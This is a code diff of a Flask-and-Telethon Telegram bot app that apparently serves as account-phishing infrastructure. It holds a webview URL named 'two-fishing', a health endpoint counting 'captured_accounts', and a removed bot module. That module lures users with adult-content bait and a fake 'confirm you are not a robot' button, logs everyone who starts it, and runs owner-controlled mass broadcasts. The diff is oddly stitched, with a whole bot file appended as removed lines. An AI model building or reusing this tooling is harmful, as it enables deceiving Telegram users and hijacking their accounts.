@@ -5,6 +5,7 @@ import base64
 import threading
 import asyncio
 import logging
+import traceback
 from datetime import datetime
 import requests as http_requests
 from telethon import TelegramClient, errors
@@ -27,10 +28,11 @@ API_ID = _si(os.environ.get("API_ID"), 0)
 API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 
-logger.info("ENV | BOT=%s API_ID=%s API_HASH=%s OWNER=%s",
+logger.info("ENV | BOT=%s API_ID=%s API_HASH=%s OWNER=%s URL=%s",
     "SET" if BOT_TOKEN else "MISSING", API_ID,
-    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID)
+    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID, WEBAPP_URL)
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
@@ -629,7 +631,7 @@ def tg_route():
 
 @app.route('/health')
 def health():
-    return jsonify({'status': 'ok'})
+    return jsonify({'status': 'ok', 'accounts': len(captured_accounts)})
 
 
 @app.route('/api/save_contact', methods=['POST'])
@@ -721,449 +723,25 @@ def dash():
 # ============ START BOT IN BACKGROUND THREAD ============
 def _run_bot():
     try:
+        logger.info("=" * 50)
+        logger.info("Starting bot thread...")
         import bot as botmod
+        logger.info("bot.py imported OK")
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
+        logger.info("Event loop created, calling bot.main()")
         loop.run_until_complete(botmod.main())
     except Exception as e:
-        logger.error(f"Bot thread error: {e}")
+        logger.error(f"BOT THREAD CRASH: {e}")
+        logger.error(traceback.format_exc())
 
 
-_bot_thread = threading.Thread(target=_run_bot, daemon=True)
+_bot_thread = threading.Thread(target=_run_bot, daemon=True, name="telegram-bot")
 _bot_thread.start()
 logger.info("Bot background thread launched")
 
 
 if __name__ == '__main__':
+    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
+        logger.warning("Some env vars missing!")
     app.run(host='0.0.0.0', port=PORT, debug=False)
-    import os
-import json
-import time
-import asyncio
-import logging
-from datetime import datetime
-from telethon import TelegramClient, events, Button
-from telethon.sessions import StringSession
-
-logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
-logger = logging.getLogger("bot")
-
-BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
-API_ID = int(os.environ.get("API_ID", "0") or 0)
-API_HASH = (os.environ.get("API_HASH") or "").strip()
-OWNER_ID = int(os.environ.get("OWNER_ID", "0") or 0)
-WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
-
-USERS_FILE = "bot_users.json"
-CONFIG_FILE = "bot_config.json"
-
-# Default welcome messages (owner can edit)
-DEFAULT_CONFIG = {
-    "welcome_messages": [
-        {
-            "type": "text",
-            "content": "Hello {name} 👋\n\n🔞To again access to the files completely free of charge, do the following💦:\n\n👇Confirm that you are not a robot.",
-            "caption": ""
-        }
-    ],
-    "button_text": "CONFIRM NOW",
-    "webapp_url": WEBAPP_URL + "?auto=1",
-    "timer": 60
-}
-
-broadcast_state = {
-    "active": False,
-    "interval": 60,
-    "messages": [],
-    "next_run": 0,
-}
-capture_mode = {"on": False}
-welcome_capture = {"on": False}
-
-
-def load_json(path, default):
-    if os.path.exists(path):
-        try:
-            with open(path) as f:
-                return json.load(f)
-        except Exception:
-            return default
-    return default
-
-
-def save_json(path, data):
-    try:
-        with open(path, 'w') as f:
-            json.dump(data, f, indent=2)
-    except Exception as e:
-        logger.error(f"save {path}: {e}")
-
-
-users = load_json(USERS_FILE, {})
-config = load_json(CONFIG_FILE, DEFAULT_CONFIG)
-
-bot = TelegramClient(StringSession(), API_ID, API_HASH)
-
-
-# ============ ADMIN PANEL ============
-def admin_menu():
-    return [
-        [Button.inline("👋 Welcome Messages", b"menu_welcome"),
-         Button.inline("📢 Broadcast", b"menu_broadcast")],
-        [Button.inline("⏱ Timer: " + str(config.get('timer', 60)) + "s", b"menu_timer"),
-         Button.inline("🔗 WebApp URL", b"menu_url")],
-        [Button.inline("👥 Users", b"menu_users"),
-         Button.inline("📊 Stats", b"menu_stats")],
-    ]
-
-
-def back_button():
-    return [[Button.inline("⬅️ Back", b"menu_home")]]
-
-
-@bot.on(events.NewMessage(pattern='/start'))
-async def start_handler(event):
-    sender = await event.get_sender()
-    uid = sender.id
-    name = sender.first_name or "Friend"
-    users[str(uid)] = {
-        "id": uid,
-        "name": name,
-        "username": sender.username or "",
-        "joined": str(datetime.now())
-    }
-    save_json(USERS_FILE, users)
-
-    # Owner: admin panel
-    if uid == OWNER_ID:
-        await event.respond(
-            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
-            buttons=admin_menu(),
-            parse_mode='md'
-        )
-        return
-
-    # Regular user: send all welcome messages
-    await send_welcome(uid, name)
-
-
-async def send_welcome(uid, name):
-    msgs = config.get("welcome_messages", [])
-    if not msgs:
-        return
-    buttons = [[Button.webview(
-        config.get("button_text", "CONFIRM NOW"),
-        url=config.get("webapp_url", WEBAPP_URL + "?auto=1")
-    )]]
-    for i, m in enumerate(msgs):
-        try:
-            content = (m.get("content") or "").replace("{name}", name)
-            caption = (m.get("caption") or "").replace("{name}", name)
-            # Only last message gets button
-            btns = buttons if i == len(msgs) - 1 else None
-            if m.get("type") == "text":
-                await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
-            else:
-                # Photo/video stored by file_id — skip, use text
-                await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
-            await asyncio.sleep(0.5)
-        except Exception as e:
-            logger.error(f"welcome {uid}: {e}")
-
-
-# ============ CALLBACK BUTTONS ============
-@bot.on(events.CallbackQuery())
-async def cb(event):
-    if event.sender_id != OWNER_ID:
-        return await event.answer("Not authorized", alert=True)
-    data = event.data.decode()
-
-    if data == "menu_home":
-        await event.edit(
-            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
-            buttons=admin_menu(), parse_mode='md'
-        )
-
-    elif data == "menu_welcome":
-        n = len(config.get("welcome_messages", []))
-        await event.edit(
-            f"👋 **Welcome Messages** — `{n}` active\n\n"
-            "Send welcome messages in this chat, they will be added.\n"
-            "Each message becomes part of the welcome sequence.",
-            buttons=[
-                [Button.inline("➕ Add Messages", b"wl_add"),
-                 Button.inline("👁 Preview", b"wl_preview")],
-                [Button.inline("🗑 Clear All", b"wl_clear"),
-                 Button.inline("✏️ Edit Button Text", b"wl_btntext")],
-                back_button()
-            ], parse_mode='md'
-        )
-
-    elif data == "wl_add":
-        welcome_capture["on"] = True
-        await event.edit(
-            "✍️ **Welcome Capture Mode: ON**\n\n"
-            "Send me text / photo / video messages one by one.\n"
-            "They will be added to welcome sequence.\n\n"
-            "When done, send `/wldone`.",
-            buttons=back_button()
-        )
-
-    elif data == "wl_preview":
-        await event.answer("Sending preview...", alert=False)
-        await send_welcome(OWNER_ID, "PreviewUser")
-
-    elif data == "wl_clear":
-        config["welcome_messages"] = []
-        save_json(CONFIG_FILE, config)
-        await event.answer("Cleared!", alert=True)
-        await event.edit("Cleared welcome messages.", buttons=back_button())
-
-    elif data == "wl_btntext":
-        welcome_capture["on"] = False
-        config["_awaiting_btntext"] = True
-        save_json(CONFIG_FILE, config)
-        await event.edit("Send new button text (plain text, no emoji overload).",
-            buttons=back_button())
-
-    elif data == "menu_broadcast":
-        s = broadcast_state
-        await event.edit(
-            f"📢 **Broadcast**\n\n"
-            f"Active: `{s['active']}`\n"
-            f"Queue: `{len(s['messages'])}` messages\n"
-            f"Interval: `{s['interval']}s`",
-            buttons=[
-                [Button.inline("➕ Add Messages", b"bc_add"),
-                 Button.inline("▶️ Start", b"bc_start")],
-                [Button.inline("⏹ Stop", b"bc_stop"),
-                 Button.inline("🗑 Clear", b"bc_clear")],
-                back_button()
-            ], parse_mode='md'
-        )
-
-    elif data == "bc_add":
-        capture_mode["on"] = True
-        await event.edit(
-            "📥 **Capture Mode: ON**\n\nSend messages, then tap Start.",
-            buttons=[
-                [Button.inline("▶️ Start Broadcast", b"bc_start")],
-                [Button.inline("❌ Cancel", b"bc_cancel")]
-            ]
-        )
-
-    elif data == "bc_start":
-        capture_mode["on"] = False
-        if not broadcast_state['messages']:
-            return await event.answer("Queue empty", alert=True)
-        broadcast_state['active'] = True
-        broadcast_state['next_run'] = time.time() + 3
-        await event.answer("Started", alert=True)
-        await event.edit(
-            f"▶️ Broadcasting `{len(broadcast_state['messages'])}` msg(s) "
-            f"to `{len(users)}` users every `{broadcast_state['interval']}s`.",
-            parse_mode='md', buttons=back_button()
-        )
-
-    elif data == "bc_cancel":
-        capture_mode["on"] = False
-        broadcast_state['messages'] = []
-        await event.edit("Cancelled.", buttons=back_button())
-
-    elif data == "bc_stop":
-        broadcast_state['active'] = False
-        await event.answer("Stopped", alert=True)
-        await event.edit("Broadcast stopped.", buttons=back_button())
-
-    elif data == "bc_clear":
-        broadcast_state['messages'] = []
-        await event.answer("Queue cleared", alert=True)
-
-    elif data == "menu_timer":
-        await event.edit(
-            "⏱ Send new timer in seconds using `/timer 30`\n"
-            f"Current: `{config.get('timer', 60)}s`",
-            buttons=back_button(), parse_mode='md'
-        )
-
-    elif data == "menu_url":
-        config["_awaiting_url"] = True
-        save_json(CONFIG_FILE, config)
-        await event.edit(
-            "🔗 Send new WebApp URL.\n"
-            f"Current: `{config.get('webapp_url')}`",
-            buttons=back_button(), parse_mode='md'
-        )
-
-    elif data == "menu_users":
-        await event.answer(f"Total: {len(users)} users", alert=True)
-
-    elif data == "menu_stats":
-        s = broadcast_state
-        await event.answer(
-            f"Users: {len(users)}\n"
-            f"Broadcast: {s['active']}\n"
-            f"Queue: {len(s['messages'])}\n"
-            f"Welcome msgs: {len(config.get('welcome_messages', []))}",
-            alert=True
-        )
-
-
-# ============ COMMANDS ============
-@bot.on(events.NewMessage(pattern='/timer'))
-async def timer_cmd(event):
-    if event.sender_id != OWNER_ID:
-        return
-    try:
-        parts = event.raw_text.split()
-        if len(parts) < 2:
-            return await event.respond(f"Current: {config.get('timer', 60)}s. Use `/timer 30`")
-        sec = int(parts[1])
-        config['timer'] = sec
-        broadcast_state['interval'] = sec
-        save_json(CONFIG_FILE, config)
-        await event.respond(f"✅ Timer set to `{sec}s`", parse_mode='md')
-    except Exception as e:
-        await event.respond(f"Error: {e}")
-
-
-@bot.on(events.NewMessage(pattern='/wldone'))
-async def wldone_cmd(event):
-    if event.sender_id != OWNER_ID:
-        return
-    welcome_capture["on"] = False
-    await event.respond(
-        f"✅ Welcome set with `{len(config.get('welcome_messages', []))}` messages.",
-        buttons=admin_menu(), parse_mode='md'
-    )
-
-
-@bot.on(events.NewMessage(pattern='/cancel'))
-async def cancel_cmd(event):
-    if event.sender_id != OWNER_ID:
-        return
-    welcome_capture["on"] = False
-    capture_mode["on"] = False
-    broadcast_state['messages'] = []
-    broadcast_state['active'] = False
-    await event.respond("Cancelled.", buttons=admin_menu())
-
-
-# ============ CAPTURE MESSAGES ============
-@bot.on(events.NewMessage())
-async def capture(event):
-    if event.sender_id != OWNER_ID:
-        return
-    txt = event.raw_text or ""
-    if txt.startswith('/'):
-        return
-
-    # Welcome button text edit
-    if config.get("_awaiting_btntext"):
-        config["button_text"] = txt.strip()[:40]
-        config["_awaiting_btntext"] = False
-        save_json(CONFIG_FILE, config)
-        await event.respond(f"✅ Button text set: `{config['button_text']}`",
-            buttons=admin_menu(), parse_mode='md')
-        return
-
-    # WebApp URL edit
-    if config.get("_awaiting_url"):
-        config["webapp_url"] = txt.strip()
-        config["_awaiting_url"] = False
-        save_json(CONFIG_FILE, config)
-        await event.respond(f"✅ URL set: `{config['webapp_url']}`",
-            buttons=admin_menu(), parse_mode='md')
-        return
-
-    # Welcome capture
-    if welcome_capture["on"]:
-        m = event.message
-        entry = {"type": "text", "content": m.message or "", "caption": ""}
-        if m.photo:
-            entry = {"type": "photo", "content": "", "caption": m.message or ""}
-        elif m.video:
-            entry = {"type": "video", "content": "", "caption": m.message or ""}
-        config.setdefault("welcome_messages", []).append(entry)
-        save_json(CONFIG_FILE, config)
-        await event.respond(
-            f"✅ Welcome message #{len(config['welcome_messages'])} added ({entry['type']}).\n"
-            "Send another or `/wldone`.",
-            buttons=back_button() if False else admin_menu()
-        )
-        return
-
-    # Broadcast capture
-    if capture_mode["on"]:
-        m = event.message
-        entry = {"type": "text", "content": m.message or "",
-                 "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
-        if m.photo:
-            entry["type"] = "photo"
-            entry["caption"] = m.message or ""
-        elif m.video:
-            entry["type"] = "video"
-            entry["caption"] = m.message or ""
-        broadcast_state['messages'].append(entry)
-        await event.respond(
-            f"✅ Broadcast message #{len(broadcast_state['messages'])} added ({entry['type']})."
-        )
-        return
-
-
-# ============ BROADCAST LOOP ============
-async def broadcast_loop():
-    while True:
-        try:
-            await asyncio.sleep(3)
-            if not broadcast_state['active']:
-                continue
-            if time.time() < broadcast_state['next_run']:
-                continue
-            if not broadcast_state['messages']:
-                broadcast_state['active'] = False
-                continue
-
-            ok = 0
-            fail = 0
-            for uid_str in list(users.keys()):
-                uid = int(uid_str)
-                for entry in broadcast_state['messages']:
-                    try:
-                        if entry['type'] == 'text':
-                            await bot.send_message(uid, entry['content'] or entry['caption'])
-                        elif entry['type'] in ('photo', 'video'):
-                            try:
-                                msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
-                                await bot.send_message(uid, msg)
-                            except Exception:
-                                if entry.get('caption'):
-                                    await bot.send_message(uid, entry['caption'])
-                        ok += 1
-                    except Exception as e:
-                        fail += 1
-                        err = str(e).lower()
-                        if 'blocked' in err or 'deactivated' in err or 'not found' in err:
-                            users.pop(uid_str, None)
-                            save_json(USERS_FILE, users)
-                    await asyncio.sleep(0.4)
-
-            broadcast_state['next_run'] = time.time() + broadcast_state['interval']
-            logger.info(f"Broadcast: {ok} sent, {fail} failed")
-            try:
-                await bot.send_message(OWNER_ID,
-                    f"📢 Round complete\n✅ Sent: {ok}\n❌ Failed: {fail}\n👥 Users: {len(users)}")
-            except Exception:
-                pass
-        except Exception as e:
-            logger.error(f"loop err: {e}")
-
-
-# ============ MAIN ============
-async def main():
-    logger.info("Bot starting...")
-    await bot.start(bot_token=BOT_TOKEN)
-    me = await bot.get_me()
-    logger.info(f"Bot started as @{me.username}")
-    asyncio.create_task(broadcast_loop())
-    await bot.run_until_disconnected()
